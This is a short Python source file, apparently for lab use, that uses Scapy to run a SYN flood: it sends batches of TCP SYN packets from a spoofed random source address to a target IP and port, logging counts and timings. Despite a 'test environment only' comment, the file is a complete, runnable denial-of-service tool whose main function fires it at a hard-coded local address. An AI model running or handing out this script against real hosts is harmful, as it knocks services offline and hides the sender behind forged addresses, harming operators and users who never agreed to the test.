from scapy.all import *
import random
import time
import datetime

from scapy.layers.inet import IP, TCP


def syn_flood(target_ip, target_port, packets_per_batch=10000, batches=100, log_file = "syn_results_p.txt"):
    with open(log_file, "a") as log:
        log.write(f"\n\n--- SYN Flood Simulation Started at {time.time()} ---\n")
        total_packets_sent = 0
        src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        src_port = random.randint(1024, 65535)
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 100000))
        start_time = time.time()
        for batch in range(batches):
            print(f"\n[Batch {batch + 1}/{batches}] Sending {packets_per_batch} SYN packets...")
            for _ in range(packets_per_batch):
                send(ip/tcp, verbose=False)
                total_packets_sent += 1
                log.write(f" SEQ = {total_packets_sent} TTL[{time.time() - start_time}] \n")

        end_time = time.time()
        total_time = end_time - start_time
        avg_time_per_packet = total_time / total_packets_sent
        log.write(f"\n--- SYN flood simulation complete ---\n")
        log.write(f"Total Time = {total_time}\n Avg Time = {avg_time_per_packet}\n")
        log.write(f"Total packets sent: {total_packets_sent}")

# Example usage (USE ON TEST ENVIRONMENT ONLY)
# syn_flood("192.168.1.100", 80)
def main():
    syn_flood("192.168.1.225", 40000)

if __name__ == "__main__":
    main()
